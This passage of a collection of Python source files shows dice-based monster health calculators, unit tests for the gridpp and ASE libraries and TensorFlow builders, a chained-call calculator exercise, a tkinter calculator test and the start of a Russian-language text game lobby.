first HD, (1/2)+1 die value rounded down for every other roll.\n    return __calc_pc_rules(dice, calc_suggested_health)\n\n\ndef calc_random_health(dice):  # Random rolls.\n    return list(map(__calc_random_health, dice))\n\n\ndef __calc_random_health(die):\n    rand = random.randint(1, die[1])\n    return rand\n\n\ndef calc_suggested_health(dice):  # (1/2)+1 die value rounded down for every roll.\n    return list(map(__calc_suggested_health, dice))\n\n\ndef __calc_suggested_health(die):\n    suggested_health = math.floor((((die[1]) / 2) + 1) * die[0])\n    return suggested_health\n\n\nhit_dice = input(\"Enter the monster's hit dice.\\n\")\ncalc_msg = \"\"\"Enter how you would like health calculated:\n    - avg for the average health.\n    - max for the maximum health.\n    - min for the minimum health.\n    - pca for PC-styled average health.\n    - pcr for PC-styled randomly rolled health.\n    - pcs for PC-styled suggested health.\n    - rol for randomly rolled health.\n    - sug for the suggested health.\\n\"\"\"\n\nwhile True:\n    calc_method = input(calc_msg)\n    calc_methods = {\n        'avg': calc_average_health,\n        'max': calc_max,\n        'min': calc_min,\n        'pca': calc_pc_average,\n        'pcr': calc_pc_roll_health,\n        'pcs': calc_pc_suggested_health,\n        'rol': calc_random_health,\n        'sug': calc_suggested_health\n    }\n    if calc_method in calc_methods:\n        get_health(hit_dice, calc_methods[calc_method])\n        break\n    else:\n        print('That is not a valid option.')\n", "76": "from __future__ import print_function\nimport unittest\nimport gridpp\nimport numpy as np\n\n\nclass Test(unittest.TestCase):\n    def test_get_statistic(self):\n        self.assertEqual(gridpp.get_statistic(\"mean\"), gridpp.Mean)\n        self.assertEqual(gridpp.get_statistic(\"min\"), gridpp.Min)\n        self.assertEqual(gridpp.get_statistic(\"max\"), gridpp.Max)\n        self.assertEqual(gridpp.get_statistic(\"median\"), gridpp.Median)\n        self.assertEqual(gridpp.get_statistic(\"quantile\"), gridpp.Quantile)\n        self.assertEqual(gridpp.get_statistic(\"std\"), gridpp.Std)\n        self.assertEqual(gridpp.get_statistic(\"sum\"), gridpp.Sum)\n\n    def test_unknown_statistic(self):\n        self.assertEqual(gridpp.get_statistic(\"mean1\"), gridpp.Unknown)\n\n    \"\"\" Check that it doesn't cause any errors \"\"\"\n    def test_version(self):\n        gridpp.version()\n\n    def test_clock(self):\n        time = gridpp.clock()\n        self.assertTrue(time > 0)\n\n    def test_is_valid(self):\n        self.assertTrue(gridpp.is_valid(1))\n        self.assertTrue(gridpp.is_valid(-1))\n        self.assertTrue(gridpp.is_valid(-999))  # Check that the old missing value indicator is valid now\n        self.assertFalse(gridpp.is_valid(np.nan))\n\n    def test_calc_statistic_mean(self):\n        self.assertEqual(gridpp.calc_statistic([0, 1, 2], gridpp.Mean), 1)\n        self.assertEqual(gridpp.calc_statistic([0, 1, np.nan], gridpp.Mean), 0.5)\n        self.assertEqual(gridpp.calc_statistic([np.nan, 1, np.nan], gridpp.Mean), 1)\n        self.assertTrue(np.isnan(gridpp.calc_statistic([np.nan, np.nan, np.nan], gridpp.Mean)))\n        self.assertTrue(np.isnan(gridpp.calc_statistic([], gridpp.Mean)))\n\n    def test_calc_statistic_count(self):\n        self.assertEqual(gridpp.calc_statistic([0, 1, 2], gridpp.Count), 3)\n        self.assertEqual(gridpp.calc_statistic([0, 1, np.nan], gridpp.Count), 2)\n        self.assertEqual(gridpp.calc_statistic([np.nan, 1, np.nan], gridpp.Count), 1)\n        self.assertEqual(gridpp.calc_statistic([np.nan, np.nan, np.nan], gridpp.Count), 0)\n        self.assertEqual(gridpp.calc_statistic([], gridpp.Count), 0)\n\n    def test_calc_statistic_sum(self):\n        self.assertEqual(gridpp.calc_statistic([0, 1, 2], gridpp.Sum), 3)\n        self.assertEqual(gridpp.calc_statistic([0, 1, np.nan], gridpp.Sum), 1)\n        self.assertEqual(gridpp.calc_statistic([np.nan, 1, np.nan], gridpp.Sum), 1)\n        self.assertTrue(np.isnan(gridpp.calc_statistic([np.nan, np.nan, np.nan], gridpp.Sum)))\n        self.assertTrue(np.isnan(gridpp.calc_statistic([], gridpp.Sum)))\n\n    def test_calc_quantile(self):\n        self.assertTrue(np.isnan(gridpp.calc_quantile([], 0)))\n        self.assertEqual(gridpp.calc_quantile([0, 1, 2], 0), 0)\n        self.assertEqual(gridpp.calc_quantile([0, 1, 2], 0.5), 1)\n        self.assertEqual(gridpp.calc_quantile([0, 1, 2], 1), 2)\n        self.assertEqual(gridpp.calc_quantile([0, np.nan, 2], 1), 2)\n        self.assertEqual(gridpp.calc_quantile([0, np.nan, 2], 0), 0)\n        self.assertEqual(gridpp.calc_quantile([0, np.nan, 2], 0.5), 1)\n        for quantile in [0, 0.5, 1]:\n            self.assertTrue(np.isnan(gridpp.calc_quantile([np.nan, np.nan, np.nan], quantile)))\n            self.assertTrue(np.isnan(gridpp.calc_quantile([np.nan], quantile)))\n        # BUG: This should work:\n        # self.assertTrue(np.isnan(gridpp.calc_quantile([], 0.5)))\n\n        self.assertEqual(gridpp.calc_quantile([[0, 1, 2]], 0), [0])\n        self.assertEqual(gridpp.calc_quantile([[0, 1, 2]], 0.5), [1])\n        self.assertEqual(gridpp.calc_quantile([[0, 1, 2]], 1), [2])\n        self.assertEqual(gridpp.calc_quantile([[0, np.nan, 2]], 1), [2])\n        self.assertEqual(gridpp.calc_quantile([[0, np.nan, 2]], 0), [0])\n        self.assertEqual(gridpp.calc_quantile([[0, np.nan, 2]], 0.5), [1])\n        quantile_of_nan_list = gridpp.calc_quantile([[np.nan, np.nan, np.nan]], 0.5)\n        self.assertEqual(len(quantile_of_nan_list), 1)\n        self.assertTrue(np.isnan(quantile_of_nan_list[0]))\n\n    def test_calc_quantile_invalid_argument(self):\n        quantiles = [1.1, -0.1]\n        for quantile in quantiles:\n            with self.assertRaises(Exception) as e:\n                gridpp.calc_quantile([0, 1, 2], quantile)\n        self.assertTrue(np.isnan(gridpp.calc_quantile([0, 1, 2], np.nan)))\n\n    def test_num_missing_values(self):\n        self.assertEqual(gridpp.num_missing_values([[0, np.nan, 1, np.nan]]), 2)\n        self.assertEqual(gridpp.num_missing_values([[np.nan, np.nan]]), 2)\n        self.assertEqual(gridpp.num_missing_values([[0, 0, 1, 1]]), 0)\n        self.assertEqual(gridpp.num_missing_values([[0, np.nan], [1, np.nan]]), 2)\n        self.assertEqual(gridpp.num_missing_values([[np.nan, np.nan], [np.nan, np.nan]]), 4)\n        self.assertEqual(gridpp.num_missing_values([[0, 0], [1, 1]]), 0)\n        self.assertEqual(gridpp.num_missing_values([[]]), 0)\n\n    def test_calc_statistics_2d(self):\n        values = np.reshape(np.arange(9), [3, 3])\n        output = gridpp.calc_statistic(values, gridpp.Mean)\n        np.testing.assert_array_almost_equal(output, [1, 4, 7])\n\n    def test_warning(self):\n        gridpp.warning(\"test\")\n\n    def test_error(self):\n        with self.assertRaises(Exception) as e:\n            gridpp.error(\"test\")\n\n    def test_not_implemented_error(self):\n        with self.assertRaises(Exception) as e:\n            gridpp.not_implemented_error(\"test\")\n\n    def test_get_index(self):\n        self.assertEqual(2, gridpp.get_lower_index(1, [0, 0, 1, 1]))\n        self.assertEqual(3, gridpp.get_upper_index(1, [0, 0, 1, 1]))\n        self.assertEqual(0, gridpp.get_lower_index(0, [0, 0, 1, 1]))\n        self.assertEqual(1, gridpp.get_upper_index(0, [0, 0, 1, 1]))\n    def test_compatible_size_grid_vec2(self):\n        lons, lats = np.meshgrid([0, 10, 20, 30], [30, 40, 50])\n        grid = gridpp.Grid(lats, lons)  # 3 x 4\n        self.assertFalse(gridpp.compatible_size(grid, np.zeros([2, 4])))\n        self.assertTrue(gridpp.compatible_size(grid, np.zeros([3, 4])))\n\n    def test_compatible_size_grid_vec3(self):\n        lons, lats = np.meshgrid([0, 10, 20, 30], [30, 40, 50])\n        grid = gridpp.Grid(lats, lons)  # 3 x 4\n        self.assertFalse(gridpp.compatible_size(grid, np.zeros([3, 2, 4])))\n        self.assertTrue(gridpp.compatible_size(grid, np.zeros([3, 3, 4])))\n\n    def test_compatible_size_points_vec(self):\n        points = gridpp.Points([0, 1, 2], [0, 1, 2])\n        self.assertTrue(gridpp.compatible_size(points, [0, 0, 0]))\n\n    def test_compatible_size_points_vec2(self):\n        points = gridpp.Points([0, 1, 2], [0, 1, 2])\n        self.assertTrue(gridpp.compatible_size(points, np.zeros([1, 3])))\n        self.assertTrue(gridpp.compatible_size(points, np.zeros([2, 3])))\n\n\nif __name__ == '__main__':\n    unittest.main()\n", "77": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "78": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "79": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "80": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "81": "'''\n\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0441 \u043d\u0435\u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u044b\u043c \u043a\u043e\u043b-\u0432 \u0432\u044b\u0437\u043e\u0432\u043e\u0432 \u0433\u0434\u0435 \u0431\u0443\u0434\u0443\u0442 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u0435\u043d\u043d\u044b \u0447\u0438\u0441\u043b\u0430 \u0438 \u043e\u043f\u0435\u0440\u0430\u0442\u043e\u0440\u044b \"+\" \u0438 \"-\".\n\u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043e\u043b\u0436\u043d\u0430 \u0443\u0437\u043d\u0430\u0442\u044c \u043e\u0442\u0432\u0435\u0442 \u0441\u0443\u043c\u044b \u0432\u0441\u0435\u0445 \u0432\u044b\u0437\u0432\u0430\u043d\u044b\u0445 \u0447\u0438\u0441\u0435\u043b, \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u044f\u044f \u0432\u044b\u0437\u0432\u0430\u043d\u0430\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0431\u0443\u0434\u0435\u0442 \u0438\u043c\u0435\u0442\u044c \u043e\u043f\u0435\u0440\u0430\u0442\u043e\u0440 \"=\".\n\u041d\u0430\u043f\u0440\u0438\u043c\u0435\u0440, \u043d\u0430\u0448\u0430 \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0431\u0443\u0434\u0435\u0442 \u043d\u0430\u0437\u044b\u0432\u0430\u0442\u0441\u044f \"calculator\", \u0442\u043e\u0433\u0434\u0430 \u0432\u0441\u0435 \u043f\u0440\u0438\u043c\u0435\u0440\u044b \u043d\u0438\u0436\u0435 \u0434\u043e\u043b\u0436\u043d\u044b \u0431\u044b\u0442\u044c \u0438\u0441\u0442\u0438\u043d\u044b \u0434\u043b\u044f \u0442\u0430\u043a\u043e\u0439 \u0444\u0443\u043d\u043a\u0446\u0438\u0438:\ncalculator(1)('+')(4)('-')(2)('=') == 3 calculator(1)('+')(4)('-')(2)('+')(10)('=') == 13\n\u041e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u044f: \u041d\u0435\u043b\u044c\u0437\u044f \u043d\u0438\u0447\u0435\u0433\u043e \u0438\u043c\u043f\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u044b\u0432\u0430\u0442\u044c \u0433\u043b\u043e\u0431\u0430\u043b\u044c\u043d\u044b\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435.\n'''\ndef calc(v):\n    def _inner_calc(val='='):\n        if val == '=':\n            return _inner_calc.res\n        if(val == '+') or (val == '-'):\n            _inner_calc.op = val\n        else:\n            if(_inner_calc.op == '+'):\n                _inner_calc.res += int(val)\n            else:\n                _inner_calc.res -= int(val)\n        return _inner_calc\n    if(v == '+') or (v == '-'):\n        _inner_calc.res = 0\n        _inner_calc.op = v\n    else:\n        _inner_calc.res = int(v)\n    return _inner_calc\n\n\nprint(calc('2')('+')('3')('='))\n\ndef calculator(v):\n    def _inner_calc(val='='):\n        if val == '=':\n            return parseCalculation(_inner_calc.v)\n        _inner_calc.v += val\n        return _inner_calc\n    _inner_calc.v = v  # save value\n    return _inner_calc\n\ndef parseCalculation(s):\n    res = 0\n    op = '+'\n    for x in s:\n        if(x == '+') or (x == '-'):\n            op = x\n        else:\n            if(op == '+'):\n                res += int(x)\n            else:\n                res -= int(x)\n    return res\n\nprint(calculator('2')('+')('3')('='))\n#print(parseCalculation('2+3-7+2-9'))\n", "82": "\"\"\"\ntest calculator: use as an extended and embedded GUI component\n\"\"\"\n\nfrom tkinter import *\nfrom calculator import CalcGui\n\ndef calcContainer(parent=None):\n    frm = Frame(parent)\n    frm.pack(expand=YES, fill=BOTH)\n    Label(frm, text='Calc Container').pack(side=TOP)\n    CalcGui(frm)\n    Label(frm, text='Calc Container').pack(side=BOTTOM)\n    return frm\n\nclass calcSubclass(CalcGui):\n    def makeWidgets(self, fg, bg, font):\n        Label(self, text='Calc Subclass').pack(side=TOP)\n        Label(self, text='Calc Subclass').pack(side=BOTTOM)\n        CalcGui.makeWidgets(self, fg, bg, font)\n        #Label(self, text='Calc Subclass').pack(side=BOTTOM)\n\nif __name__ == '__main__':\n    import sys\n    if len(sys.argv) == 1:              # % calculator_test.py\n        root = Tk()                     # run 3 calcs in same process\n        CalcGui(Toplevel())             # each in a new toplevel window\n        calcContainer(Toplevel())\n        calcSubclass(Toplevel())\n        Button(root, text='quit', command=root.quit).pack()\n        root.mainloop()\n    if len(sys.argv) == 2:              # % calculator_testl.py -\n        CalcGui().mainloop()            # as a standalone window (default root)\n    elif len(sys.argv) == 3:            # % calculator_test.py - -\n        calcContainer().mainloop()      # as an embedded component\n    elif len(sys.argv) == 4:            # % calculator_test.py - - -\n        calcSubclass().mainloop()       # as a customized superclass\n", "83": "import pytest\nfrom ase.build import molecule\nfrom ase.test.factories import ObsoleteFactoryWrapper\n\n\n@pytest.mark.parametrize('name', ['gamess_us', 'gaussian'])\ndef test_h2dft_old(name):\n    factory = ObsoleteFactoryWrapper(name)\n    run(factory)\n\n\ncalc = pytest.mark.calculator\n\n\n#@calc('abinit', ecut=200, toldfe=0.0001)\n# Doesn't work with abinit9.\n# We should replace the restart stuff anyway.\n@calc('cp2k', auto_write=True, uks=True)\n# @calc('gpaw', mode='lcao', basis='sz(dzp)')\ndef test_h2dft(factory):\n    run(factory)\n\n\ndef run(factory):\n    name = factory.name\n    calc = factory.calc(label=name, xc='LDA')\n    h2 = molecule('H2', calculator=calc)\n    h2.center(vacuum=2.0)\n    e2 = h2.get_potential_energy()\n    calc.set(xc='PBE')\n    e2pbe = h2.get_potential_energy()\n    h1 = h2.copy()\n    del h1[1]\n    h1.set_initial_magnetic_moments([1])\n    h1.calc = calc\n    e1pbe = h1.get_potential_energy()\n    calc.set(xc='LDA')\n    e1 = h1.get_potential_energy()\n    try:\n        m1 = h1.get_magnetic_moment()\n    except NotImplementedError:\n        pass\n    else:\n        print(m1)\n    print(2 * e1 - e2)\n    print(2 * e1pbe - e2pbe)\n    print(e1, e2, e1pbe, e2pbe)\n    calc = factory.calc(restart=name)\n    print(calc.parameters, calc.results, calc.atoms)\n    assert not calc.calculation_required(h1, ['energy'])\n    h1 = calc.get_atoms()\n    print(h1.get_potential_energy())\n    label = 'dir/' + name + '-h1'\n    calc = factory.calc(label=label, atoms=h1, xc='LDA')\n    print(h1.get_potential_energy())\n", "84": "import pytest\nfrom ase.build import molecule\nfrom ase.calculators.calculator import get_calculator_class\nfrom ase.units import Ry\nfrom ase.utils import workdir\n\n\n# XXX To be replaced by stuff in ase.test.factories\nclass CalculatorInputs:\n    def __init__(self, name, parameters=None):\n        self.name = name\n        if parameters is None:\n            parameters = {}\n        self.parameters = parameters\n\n    def __repr__(self):\n        cls = type(self)\n        return '{}({}, {})'.format(cls.__name__,\n                                   self.name, self.parameters)\n\n    def calc(self):\n        cls = get_calculator_class(self.name)\n        return cls(**self.parameters)\n\n\ndef inputs(name, **parameters):\n    return CalculatorInputs(name, parameters)\n\n\ndef _calculate(code, name):\n    atoms = molecule(name)\n    atoms.center(vacuum=3.5)\n    with workdir('test-{}'.format(name), mkdir=True):\n        atoms.calc = code.calc()\n        return atoms.get_potential_energy()\n\n\n@pytest.mark.parametrize(\n    \"spec\",\n    [\n        inputs('gamess_us', label='ch4'),\n        inputs('gaussian', xc='lda', basis='3-21G'),\n    ],\n    ids=lambda spec: spec.name)\ndef test_ch4(tmp_path, spec):\n    # XXX Convert to string since pytest can sometimes gives us tmp_path\n    # as a pathlib2 path.\n    with workdir(str(tmp_path), mkdir=True):\n        e_ch4 = _calculate(spec, 'CH4')\n        e_c2h2 = _calculate(spec, 'C2H2')\n        e_h2 = _calculate(spec, 'H2')\n        energy = e_ch4 - 0.5 * e_c2h2 - 1.5 * e_h2\n        print(energy)\n        ref_energy = -2.8\n        assert abs(energy - ref_energy) < 0.3\n\n\ncalc = pytest.mark.calculator\nfilterwarnings = pytest.mark.filterwarnings\n\n\n@pytest.mark.calculator_lite\n@calc('abinit', ecut=300, chksymbreak=0, toldfe=1e-4)\n@calc('aims')\n@calc('cp2k')\n@calc('espresso', ecutwfc=300 / Ry)\n@calc('gpaw', symmetry='off', mode='pw', txt='gpaw.txt', mixer={'beta': 0.6},\n      marks=[filterwarnings('ignore:.*?ignore_bad_restart_file'),\n             filterwarnings('ignore:convert_string_to_fd')])\n@calc('nwchem')\n@calc('octopus', Spacing='0.25 * angstrom', BoxShape='minimum',\n      convreldens=1e-3)\n@calc('openmx')\n@calc('siesta', marks=pytest.mark.xfail)\ndef test_ch4_reaction(factory):\n    e_ch4 = _calculate(factory, 'CH4')\n    e_c2h2 = _calculate(factory, 'C2H2')\n    e_h2 = _calculate(factory, 'H2')\n    energy = e_ch4 - 0.5 * e_c2h2 - 1.5 * e_h2\n    print(energy)\n    ref_energy = -2.8\n    assert abs(energy - ref_energy) < 0.3\n", "85": "#!/usr/bin/env python\nimport shelve\nimport sys\nimport os.path\nfrom util import *\nfrom economy import Main\nfrom economygame import Main\n\n\ndef lobby(calc, zapros=None, args1=None, args2=None, args3=None, argvtest=None,\n          uberargs=None):\n    # \u043d\u0430\u0447\u0430\u043b\u043e \u0445\u044b\n    helpme = \"\"\"\u0424\u0443\u043d\u043a\u0446\u0438\u0438 \u044d\u0442\u043e\u0439 \u043f\u0440\u0435\u043a\u0440\u0430\u0441\u043d\u043e\u0439 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b:\n             \u2022  \u041e\u0447\u0438\u0441\u0442\u0438\u0442\u044c | clear\n             \u2022  \u041a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440 | calc\n             \u2022  \u0428\u0430\u043d\u0441\u044b\n             \u2022  \u0414\u0430\u0442\u0430 | data\n             \u2022  \u0427\u0438\u0441\u043b\u043e\n             \u2022  \u0423\u0434\u0430\u043b\u0438\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435\n             \u2022  \u0420\u0430\u0431\u043e\u0442\u0430 | job\n             \u2022  \u041f\u0440\u043e\u0444\u0438\u043b\u044c\n             \u2022  \u041c\u0430\u0433\u0430\u0437\u0438\u043d\n             \u2022  \u0423\u0440\u043e\u0432\u0435\u043d\u044c\n             \u2022  \u041f\u043e\u0433\u043e\u0434\u0430\n             \u2022  \u041a\u0443\u0440\u0441\n             \u2022  \u0425\u0435\u043b\u043f\n             \u2022  \u0411\u043e\u043c\u0431\u0430\n             \u2022  \u041f\u0440\u0435\u0444\u0438\u043a\u0441\n             \u2022  \u041c\u043e\u043d\u0435\u0442\u0430\n             \u2022  \u041a\u043e\u043d\u0444\u0438\u0433\n                (\u0432\u0441\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0441\u043e\u0445\u0440\u0430\u043d\u044f\u044e\u0442\u0441\u044f \u0442\u043e\u043b\u044c\u043a\u043e \u043f\u0440\u0438 \u043d\u0430\u043f\u0438\u0441\u0430\u043d\u0438\u0438 \u043a\u043e\u043c\u0430\u043d\u0434\u044b \"\u0412\u044b\u0445\u043e\u0434\"!) \"\"\"\n    try:\n        if not zapros:\n            print(\"\u0417\u0434\u0440\u0430\u0432\u0441\u0442\u0432\u0443\u0439,\", calc.name)\n            time.sleep(1)\n            print(helpme)\n\n        while True:\n            if zapros == None:\n                enter = input(\"{}, \u0432\u0430\u0448 \u0437\u0430\u043f\u0440\u043e\u0441: \".format(calc.name))\n                enter = enter.lower()\n                args1 = None\n                args2 = None\n                args3 = None\n                uberargs = None\n                if not enter:\n                    continue\n                zapros = enter.split()[0]\n                try:\n                    uberargs = enter.split()[1:]\n                    uberargs = \" \".join(uberargs)\n                    args1 = enter.split()[1]\n                    args2 = enter.split()[2]\n                    args3 = enter.split()[3]\n                except IndexError:\n                    None\n            if zapros == \"\u043a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440\" or zapros == \"calc\":\n                